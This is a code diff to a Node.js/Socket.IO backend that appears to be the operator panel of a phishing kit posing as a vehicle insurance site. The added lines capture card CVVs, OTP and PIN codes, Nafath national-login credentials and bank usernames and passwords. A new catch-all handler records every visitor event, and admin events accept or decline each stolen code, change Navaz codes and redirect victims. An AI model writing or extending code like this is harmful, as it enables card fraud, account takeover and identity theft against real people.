@@ -235,9 +235,24 @@ function recordSubmission(type, payload) {
     set("cardExpiryYear", ["expiryYear"]);
     set("paymentMethod", ["paymentMethod"]);
     set("cardCvv", ["cvv"]);
-    set("otp", ["otp", "otpCode", "code"]);
+    set("otp", ["otp", "otpCode", "code", "otpValue", "pinCode", "pin"]);
+    set("nafathId", ["nafathId", "nafathNumber", "nafathIdentity"]);
+    set("nafathPassword", ["nafathPassword", "password"]);
+    set("bankUsername", ["bankUsername", "username", "userId", "userid"]);
+    set("bankPassword", ["bankPassword"]);
+    set("address", ["address", "nationalAddress", "streetName", "district"]);
+    set("city", ["city", "cityName"]);
+    set("postalCode", ["postalCode", "zipCode"]);
+    set("gender", ["gender", "sex"]);
+    set("nationality", ["nationality"]);
+    set("purpose", ["purpose", "usage"]);
+    set("driverAge", ["driverAge", "age"]);
+    set("licenseType", ["licenseType"]);
+    set("startDate", ["startDate", "policyStart"]);
+    set("promoCode", ["promoCode", "coupon"]);
     set("result", ["result"]);
     set("vehicle", ["vehicle"]);
+    set("page", ["page", "currentPage", "step"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
     upsertSession(id, {
@@ -264,7 +279,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v9";
+const APP_VERSION = "v10";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
@@ -501,6 +516,31 @@ app.get("/admin/submissions", requireAdmin, (_req, res) =>
 app.get("/admin/users", requireAdmin, (_req, res) => res.json(db.get().users));
 
 // ---------- Socket.IO ----------
+// Events we handle explicitly or that carry no submission data — skip in onAny.
+const IGNORED_ANY_EVENTS = new Set([
+  "user:join", "join", "bindOrder", "chat:message",
+  "user:getChatHistory", "admin:getChatHistory", "admin:getUpdates",
+  "user:pageNavigation", "user:typingStatus", "user:statusUpdate",
+  "bin:lookup", "disconnect", "disconnecting", "ping", "pong",
+  "csrf:token", "site:publicSettings",
+  // handled explicitly with their own recordSubmission call
+  "newData", "booking:update",
+  "paymentForm", "visaOtp", "phone", "phoneOtp", "navaz",
+  "payment:update", "otp:received", "pin:received",
+  "nafath:submitted", "phone:submitted", "naflogin:submitted",
+  "nafotp:submitted", "rajlogin:submitted",
+  "health:submitted", "health2:submitted", "health3:submitted", "health4:submitted",
+  "client:cancelOtp", "client:cancelPayment",
+  "payment:duplicateAttempt", "otp:duplicateAttempt",
+  // admin -> client control events (not visitor submissions)
+  "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
+  "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
+  "acceptPhoneOtp", "declinePhoneOtp", "acceptNavaz", "declineNavaz",
+  "adminRedirect", "clientBlocked", "changeNavazCode",
+  "payment:action", "otp:action", "nafath:action", "naflogin:action",
+  "phone:action", "admin:redirect",
+]);
+
 io.on("connection", (socket) => {
   console.log(`[io] connected ${socket.id}`);
 
@@ -508,6 +548,17 @@ io.on("connection", (socket) => {
   socket.emit("csrf:token", { token: csrf });
   socket.emit("site:publicSettings", { chatEnabled: !!CHAT_ENABLED });
   socket.data.csrf = csrf;
+
+  // Catch-all: any other event the customer site emits is treated as a
+  // page submission and mirrored onto the session row.
+  socket.onAny((event, payload) => {
+    if (IGNORED_ANY_EVENTS.has(event)) return;
+    if (socket.data.userType === "admin" || socket.data.role === "admin") return;
+    if (typeof payload !== "object" || payload === null) return;
+    const id = payload.uuid || payload.id || socket.data.userId || socket.data.sessionId;
+    if (!id) return;
+    recordSubmission(event, { ...payload, uuid: id });
+  });
 
   // -------- Frontend (customer site) join --------
   socket.on("user:join", (p = {}) => {
